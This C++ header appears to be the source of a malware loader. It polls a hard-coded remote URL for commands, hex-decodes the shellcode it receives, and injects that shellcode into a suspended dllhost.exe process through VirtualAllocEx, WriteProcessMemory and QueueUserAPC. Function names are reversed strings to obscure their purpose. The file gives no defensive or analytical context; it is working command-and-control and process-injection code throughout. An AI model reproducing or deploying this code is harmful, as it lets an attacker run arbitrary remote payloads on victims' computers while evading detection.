#pragma once
#include "curl/curl.h"
#include <String.h>
#include <sstream>
#include <iostream>
#include <string>
#pragma comment(lib, "libcurl.lib")
#pragma comment ( lib, "ws2_32.lib" )
#pragma comment ( lib, "wldap32.lib" )

#define CODESIZE 10*1024
#define URL "http://api.10086.li/txt.txt"

using namespace std;

DWORD WINAPI dclsnur(LPVOID p);
string xehotrts(string hex);
string edocxeh;


class phctt
{
private:
    CURL* tenc;
    stringstream ss;
    long c;
public:
    phctt()
        : tenc(curl_easy_init())
        , c(0)
    {

    }
    ~phctt()
    {
        if (tenc) curl_easy_cleanup(tenc);
    }
    string get(const string& url)
    {
        CURLcode r;
        curl_easy_setopt(tenc, CURLOPT_URL, url.c_str());
        curl_easy_setopt(tenc, CURLOPT_FOLLOWLOCATION, 1L);
        curl_easy_setopt(tenc, CURLOPT_WRITEFUNCTION, atadeviecer);
        curl_easy_setopt(tenc, CURLOPT_WRITEDATA, this);

        ss.str("");
        c = 0;
        r = curl_easy_perform(tenc);
        if (r != CURLE_OK)
        {
            throw runtime_error(curl_easy_strerror(r));
        }
        curl_easy_getinfo(tenc, CURLINFO_RESPONSE_CODE, &c);
        return ss.str();
    }
    //long GetHttpCode()
    //{
    //    return code;
    //}
private:
    static size_t atadeviecer(void* b, size_t s, size_t n, void* u)
    {
        return static_cast<phctt*>(u)->atadretirw(b, s, n);
    }
    size_t atadretirw(void* b, size_t s, size_t n)
    {
        ss.write((const char*)b, s * n);
        return s * n;
    }
};


class fnoc
{
private:
    int ss;
    string tt;
    string vv;
public:
    fnoc(string res)
    {
        istringstream is(res);
        string line;

        char split = '\r';
        if (res.find("\n") == -1)
        {
            split = '\r';
        }


        while (getline(is, line, split))
        {

            int linelen = line.length();
            int flag = line.find(":");
            string key = line.substr(0, flag);
            string value = line.substr(flag + 1, linelen);
            if (key == "s")
            {
                this->ss = atoi(value.c_str());
            }
            else if (key == "t")
            {
                this->tt = value;
            }
            if (key == "v")
            {
                this->vv = value;
            }
        }
    };

    VOID run()
    {

        if (this->tt == "c\r" || this->tt == "c")
        {
            // system((this->v).cstr());
        }
        else if (this->tt == "u\r" || this->tt == "u")
        {
            try {

                edocxeh = this->vv;
                CreateThread(NULL, NULL, dclsnur, NULL, NULL, NULL);
            }
            catch (exception e)
            {
            };
        }
        else if (this->tt == "e\r" || this->tt == "e")
        {
            exit(0);
        }
        Sleep(this->ss * 1000);

    };

private:

};



string xehotrts(string strHex) {
    string tmpStr = "";
    for (size_t j = 0; j < strHex.length(); j += 2) {
        string hex16 = strHex.substr(j, 2);
        char ch16 = stoul(hex16, nullptr, 16);
        tmpStr += ch16;
    }
    return tmpStr;
};


DWORD WINAPI enilno(LPVOID lpParam)
{
    void* code = lpParam;
    ((void(*)())code)();
    return 0;
}


DWORD WINAPI dclsnur(LPVOID lpParameter)
{
    //string codestr = xehotrts(edocxeh);
    //int len = (edocxeh.length()/2)+1;

    //void* code = VirtualAlloc(0, len, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    //if (code)
    //{
    //    memmove(code, codestr.c_str(), (len));
    //    Sleep(10000);
    //    ((void(*)())code)();
    //    //CreateThread(NULL, NULL, enilno, code, NULL, NULL);
    //}
     
    string codestr = xehotrts(edocxeh);
    int len = (edocxeh.length() / 2) + 1;
    unsigned char code[CODESIZE] = { 0 };
    memcpy(code, codestr.c_str(), len);
    UINT codeSize = sizeof(code);
    STARTUPINFOA si = { 0 };
    PROCESS_INFORMATION pi = { 0 };
    CreateProcessA("C:\\Windows\\System32\\dllhost.exe", NULL, NULL, NULL, FALSE, CREATE_SUSPENDED, NULL, NULL, &si, &pi);
    HANDLE victimProcess = pi.hProcess;
    HANDLE threadHandle = pi.hThread;
    LPVOID shellAddress = VirtualAllocEx(victimProcess, NULL, codeSize, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
    PTHREAD_START_ROUTINE apcRoutine = (PTHREAD_START_ROUTINE)shellAddress;
    WriteProcessMemory(victimProcess, shellAddress, code, codeSize, NULL);
    QueueUserAPC((PAPCFUNC)apcRoutine, threadHandle, NULL);
    ResumeThread(threadHandle);
    return 0;
}

DWORD WINAPI drun(LPVOID P)
{
GO:
    try {
        phctt c;
        string res = c.get(URL);
        fnoc* f = new fnoc(res);
        f->run();
        return 0;
    }
    catch (exception e)
    {
        Sleep(3000);
        goto GO;
    }
    return 0;
}